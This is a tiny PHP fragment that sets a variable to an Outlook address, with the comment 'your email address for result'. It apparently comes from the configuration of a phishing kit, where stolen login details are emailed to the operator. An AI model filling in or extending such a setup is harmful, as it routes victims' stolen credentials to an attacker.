<?php
$send="ygffffvvgcv@outlook.com"// your email address for result
?>